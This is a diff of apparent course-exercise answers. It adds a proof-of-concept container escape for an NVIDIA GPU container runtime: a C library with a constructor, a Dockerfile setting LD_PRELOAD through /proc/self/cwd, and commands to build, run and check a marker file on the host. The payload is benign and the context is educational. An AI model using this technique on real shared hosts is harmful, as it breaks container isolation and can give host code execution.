@@ -1,4 +1,39 @@
- # Exercise 2.1
+# Exercise 1
+
+poc.c file:
+
+```c
+#include <stdio.h>
+#include <stdlib.h>
+
+void __attribute__((constructor)) init() {
+        FILE *fptr;
+
+        // Open a file in writing mode
+        fptr = fopen("/tmp/output-jord-sam.txt", "w");
+        if (fptr == NULL)
+                printf("The file is not opened.");
+        else{
+                fprintf(fptr, "user: jord-sam\n");
+        }
+        fclose(fptr);
+}
+```
+Dockerfile:
+```dockerfile
+FROM busybox
+ENV LD_PRELOAD=/proc/self/cwd/poc.so
+ADD poc.so /
+```
+Commands:
+```bash
+$make poc.so
+$docker build . -t nct-exploit-jord-sam
+$docker run --rm --runtime=nvidia --gpus=all nct-exploit-jord-sam
+$cat /tmp/output-jord-sam.txt
+```
+
+# Exercise 2.1
 
 **Container GPU Issues: What security vulnerabilities might arise when GPUs 
 are shared between containers or when containers have direct GPU access?**
